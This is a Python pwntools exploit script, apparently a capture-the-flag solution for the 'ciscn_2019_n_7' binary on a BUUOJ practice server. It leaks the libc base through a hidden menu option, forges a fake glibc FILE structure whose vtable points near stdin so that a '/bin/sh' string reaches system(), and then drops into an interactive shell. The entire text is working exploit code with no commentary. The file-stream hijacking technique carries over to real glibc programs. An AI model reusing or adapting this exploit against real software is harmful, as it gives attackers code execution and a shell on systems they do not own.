import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_n_7')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_n_7')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',27039)
			elf=ELF('./ciscn_2019_n_7')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,b):
			io.sendlineafter('-> \n','1')
			io.sendlineafter('Input string Length: \n',str(a))
			io.sendafter('Author name:\n',b)

		def show(a):
			io.sendlineafter('-> \n','3')

		def edit(a,b):
			io.sendlineafter('-> \n','2')
			io.sendlineafter('New Author name:\n',str(a))
			io.sendafter('New contents:\n',b)

		def leak():
			io.sendlineafter('-> \n','666')
			io.recvuntil('0x')
			libc_base=int(io.recv(12),16)-libc.sym['puts']
			libc.address=libc_base
			return libc_base



		libc_base=leak()
		_system_addr=libc.sym['system']
		_IO_list_all=libc.sym['_IO_list_all']
		from FILE import *
		context.arch='amd64'
		fake_file=IO_FILE_plus_struct()
		fake_file._flags = 0
		fake_file._IO_read_ptr = 0x61
		fake_file._IO_read_base =0
		fake_file._IO_buf_base = 0
		fake_file._mode = 0
		fake_file._IO_write_base = 0
		fake_file._IO_write_ptr = 1
		fake_file.vtable = libc.sym['_IO_2_1_stdin_']+0x30
		pay=str(fake_file).ljust(0xe0,'\x00')
		pay='/bin/sh\x00'+pay[8:0x48]+p64(_system_addr)+pay[0x50:]

		add(0xe0,'aaaaaaaa'+p64(libc.sym['_IO_2_1_stdin_']))
		edit('aaaa',pay)
		io.sendlineafter('-> \n','\n')



		success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue